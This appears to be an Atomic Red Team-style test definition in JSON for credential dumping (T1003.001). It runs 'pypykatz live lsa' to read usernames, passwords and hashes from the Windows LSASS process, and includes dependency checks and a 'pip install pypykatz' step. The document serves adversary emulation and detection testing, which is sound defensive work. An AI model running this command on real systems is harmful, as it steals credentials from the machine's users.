{
  "id": "c37bc535-5c62-4195-9cc3-0517673171d8",
  "name": "LSASS read with pypykatz",
  "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "46c034ce-c56b-4b8c-a0b0-767a4eafe6e1",
      "type": "execute-command",
      "data": {
        "command": "pypykatz live lsa\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "adc7d75c-32f0-461e-981a-4850a557caa8",
      "name": "Check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "ded9b827-6d97-43ed-9571-e55b4b3c8a82",
      "name": "Resolve dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"Python 3 must be installed manually\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "8d856bf8-cb18-465a-b9ee-477da4271120",
      "name": "Re-check dependency 1/3",
      "description": "Computer must have python 3 installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "20f31294-a9b1-4c92-8cb4-b4ffff5f8fbc",
      "name": "Check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "36c6068e-3960-4d75-97e1-e1fdca16aea0",
      "name": "Resolve dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"PIP must be installed manually\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "1bfcc9fa-73f4-410c-93a3-da91f07d9ea4",
      "name": "Re-check dependency 2/3",
      "description": "Computer must have pip installed\n",
      "type": "execute-command",
      "data": {
        "command": "py -3 -m pip --version \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "6280c556-e7e9-48e1-9660-deddbe32f3ac",
      "name": "Check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "198b01fb-69c4-4b04-aa37-6528c583b597",
      "name": "Resolve dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pip install pypykatz\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "688707a3-23df-48e7-bcab-59b8205f50a6",
      "name": "Re-check dependency 3/3",
      "description": "pypykatz must be installed and part of PATH\n",
      "type": "execute-command",
      "data": {
        "command": "pypykatz -h \u003enul 2\u003e\u00261\nexit /b %errorlevel%\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "adc7d75c-32f0-461e-981a-4850a557caa8",
      "p": "on-success",
      "o": "46c034ce-c56b-4b8c-a0b0-767a4eafe6e1"
    },
    {
      "s": "adc7d75c-32f0-461e-981a-4850a557caa8",
      "p": "on-failure",
      "o": "ded9b827-6d97-43ed-9571-e55b4b3c8a82"
    },
    {
      "s": "ded9b827-6d97-43ed-9571-e55b4b3c8a82",
      "p": "on-success",
      "o": "8d856bf8-cb18-465a-b9ee-477da4271120"
    },
    {
      "s": "8d856bf8-cb18-465a-b9ee-477da4271120",
      "p": "on-failure",
      "o": "46c034ce-c56b-4b8c-a0b0-767a4eafe6e1"
    },
    {
      "s": "20f31294-a9b1-4c92-8cb4-b4ffff5f8fbc",
      "p": "on-success",
      "o": "46c034ce-c56b-4b8c-a0b0-767a4eafe6e1"
    },
    {
      "s": "20f31294-a9b1-4c92-8cb4-b4ffff5f8fbc",
      "p": "on-failure",
      "o": "36c6068e-3960-4d75-97e1-e1fdca16aea0"
    },
    {
      "s": "36c6068e-3960-4d75-97e1-e1fdca16aea0",
      "p": "on-success",
      "o": "1bfcc9fa-73f4-410c-93a3-da91f07d9ea4"
    },
    {
      "s": "1bfcc9fa-73f4-410c-93a3-da91f07d9ea4",
      "p": "on-failure",
      "o": "46c034ce-c56b-4b8c-a0b0-767a4eafe6e1"
    },
    {
      "s": "6280c556-e7e9-48e1-9660-deddbe32f3ac",
      "p": "on-success",
      "o": "46c034ce-c56b-4b8c-a0b0-767a4eafe6e1"
    },
    {
      "s": "6280c556-e7e9-48e1-9660-deddbe32f3ac",
      "p": "on-failure",
      "o": "198b01fb-69c4-4b04-aa37-6528c583b597"
    },
    {
      "s": "198b01fb-69c4-4b04-aa37-6528c583b597",
      "p": "on-success",
      "o": "688707a3-23df-48e7-bcab-59b8205f50a6"
    },
    {
      "s": "688707a3-23df-48e7-bcab-59b8205f50a6",
      "p": "on-failure",
      "o": "46c034ce-c56b-4b8c-a0b0-767a4eafe6e1"
    }
  ],
  "tags": [
    "T1003.001",
    "atomic-red-team"
  ]
}